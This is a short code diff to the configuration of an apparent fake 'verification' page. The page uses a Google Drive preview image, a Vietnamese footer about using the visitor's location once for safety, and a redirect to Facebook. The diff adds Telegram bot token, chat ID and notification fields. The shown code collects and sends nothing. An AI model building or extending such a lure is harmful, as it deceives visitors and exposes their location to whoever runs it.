@@ -16,6 +16,9 @@ export interface VerificationConfig {
   footerText: string;
   redirectUrl: string;
   previewImageUrl: string;
+  telegramBotToken: string;
+  telegramChatId: string;
+  telegramNotificationsEnabled: boolean;
 }
 
 const defaultConfig: VerificationConfig = {
@@ -27,6 +30,9 @@ const defaultConfig: VerificationConfig = {
     footerText: "Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.",
     redirectUrl: "https://www.facebook.com",
     previewImageUrl: "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg",
+    telegramBotToken: "",
+    telegramChatId: "",
+    telegramNotificationsEnabled: false,
 };
 
 export async function getVerificationConfigAction(): Promise<VerificationConfig> {
